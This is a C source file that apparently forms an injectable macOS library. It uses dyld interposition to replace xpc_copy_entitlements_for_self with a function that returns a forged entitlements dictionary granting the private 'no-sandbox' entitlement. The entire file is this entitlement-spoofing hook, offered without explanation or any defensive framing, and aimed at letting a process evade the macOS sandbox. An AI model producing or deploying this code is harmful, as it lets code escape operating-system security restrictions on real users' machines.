#include <stdio.h>
#include <unistd.h>

typedef void* xpc_object_t;

extern xpc_object_t xpc_dictionary_create(void*, void*, int);
extern void xpc_dictionary_set_value(xpc_object_t, const char*, xpc_object_t);
extern xpc_object_t xpc_bool_create(int);
extern xpc_object_t xpc_copy_entitlements_for_self();

#define DEBUG_LOGGING 1

#if DEBUG_LOGGING
#define DEBUG_PRINT(...) fprintf(stderr, __VA_ARGS__)
#else
#define DEBUG_PRINT(...)
#endif

#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { const void* replacement; const void* replacee; } _interpose_##_replacee \
        __attribute__ ((section ("__DATA,__interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_replacee };

xpc_object_t my_xpc_copy_entitlements_for_self() {
    DEBUG_PRINT("[*] Entering interposed xpc_copy_entitlements_for_self\n");

    // Create a new XPC dictionary
    xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);
    if (!dict) {
        DEBUG_PRINT("[!] Error creating XPC dictionary\n");
        return NULL; // Handle error gracefully
    }

    // Set custom entitlement value
    xpc_dictionary_set_value(dict, "com.apple.private.security.no-sandbox", xpc_bool_create(1));
    DEBUG_PRINT("[*] Modified entitlements dictionary\n");

    return dict;
}

DYLD_INTERPOSE(my_xpc_copy_entitlements_for_self, xpc_copy_entitlements_for_self);

